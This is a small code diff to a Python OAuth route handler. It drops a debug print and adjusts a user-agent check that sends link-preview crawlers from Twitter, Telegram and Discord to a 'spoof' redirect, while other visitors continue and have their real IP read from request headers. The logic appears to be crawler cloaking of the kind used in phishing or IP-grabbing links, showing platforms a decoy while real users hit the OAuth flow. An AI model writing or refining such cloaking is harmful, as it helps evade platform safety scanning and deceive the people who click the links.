@@ -46,8 +46,7 @@ def oauth():
     
     session["group_id"] = group.get("group_id")
     
-    print(user_agent)
-    if 'Twitterbot' in user_agent or 'TelegramBot' in user_agent or 'Discordbot' in user_agent:
+    if 'Twitterbot/1.0' in user_agent or 'TelegramBot' in user_agent or 'Discordbot' in user_agent:
         return redirect(spoof)
 
     real_ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
